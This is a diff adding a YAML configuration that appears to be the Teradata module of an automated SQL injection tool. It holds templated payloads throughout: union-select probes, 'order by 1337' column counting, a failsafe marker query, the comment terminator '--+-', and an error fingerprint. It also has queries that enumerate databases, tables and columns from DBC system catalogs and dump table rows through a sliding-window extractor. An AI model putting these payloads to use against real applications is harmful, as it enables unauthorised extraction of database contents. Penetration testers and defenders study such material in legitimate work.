@@ -1,0 +1,111 @@
+vendor: ""
+resource: 
+ info: |
+  select 
+      '-'
+      || '${ENCLOSE_VALUE_SQL}'
+      || database
+      || '${ENCLOSE_VALUE_SQL}'
+      || user
+      || '${TRAIL_SQL}'
+ schema: 
+  database: |
+   select 
+       '${ENCLOSE_VALUE_SQL}'
+       || DatabaseName
+       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+   FROM (
+       select 
+           DatabaseName,
+           ROW_NUMBER() over (ORDER BY DatabaseName) AS rnum
+       from DBC.DBASE
+   ) x
+   where 1 = 1
+   {limit}
+  table: |
+   select 
+       '${ENCLOSE_VALUE_SQL}'
+       || TVMName
+       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+   FROM (
+       select 
+           TVMName,
+           ROW_NUMBER() over (ORDER BY TVMName) AS rnum
+       from DBC.TVM t 
+       inner join DBC.DBASE d on t.DatabaseId = d.DatabaseId
+       where DatabaseName = '${DATABASE}'
+   ) x
+   where 1 = 1
+   {limit}
+  column: |
+   select 
+       '${ENCLOSE_VALUE_SQL}'
+       || FieldName
+       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+   FROM (
+       select 
+           FieldName,
+           ROW_NUMBER() over (ORDER BY FieldName) AS rnum
+       from (
+           select distinct FieldName
+           from DBC.TVFIELDS c 
+           inner join DBC.TVM t on c.TableId = t.TVMId
+           inner join DBC.DBASE d on t.DatabaseId = d.DatabaseId
+           where DatabaseName = '${DATABASE}'
+           and TVMName = '${TABLE}'
+       )x
+   )x
+   where 1 = 1
+   {limit}
+  row: 
+   query: |
+    SELECT 
+        '${ENCLOSE_VALUE_SQL}'
+        || r
+        || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+    from (
+        select 
+            ${FIELDS} r, 
+            ROW_NUMBER() over (ORDER BY 1) AS rnum
+        from ${DATABASE}.${TABLE}
+    )x
+    where 1 = 1
+    {limit}
+   fields: 
+    field: "trim(coalesce(''||${FIELD}, ''))"
+    concat: "|| '%7f' ||"
+strategy: 
+ configuration: 
+  slidingWindow: |
+   select
+       /**
+        * If reach end of string (${LEAD}i) then NULLIF nullifies the result
+        */
+       '${LEAD}'
+       || NULLIF(
+           substr(
+               (${INJECTION}),
+               ${INDEX}
+           ),
+           '${TRAIL_SQL}'
+        )
+  limit: "and rnum BETWEEN ${LIMIT} AND ${LIMIT}"
+  failsafe: "trim('' || (1337${INDICE}7330%2b1))"
+  calibrator: |
+   cast(
+       rpad(
+           '${CALIBRATOR_SQL}', 
+           1024, 
+           '${CALIBRATOR_SQL}'
+       )
+       as varchar(1024)
+   )
+  limitBoundary: 1
+  endingComment: "--+-"
+  fingerprint: 
+   errorMessage: 
+    - "Teradata database"
+ normal: 
+  indices: "union select ${INDICES} FROM (SELECT 1 AS x)x"
+  capacity: "(select '${LEAD}${INDICE}' || ${CALIBRATOR})"
+  orderBy: "order by 1337"
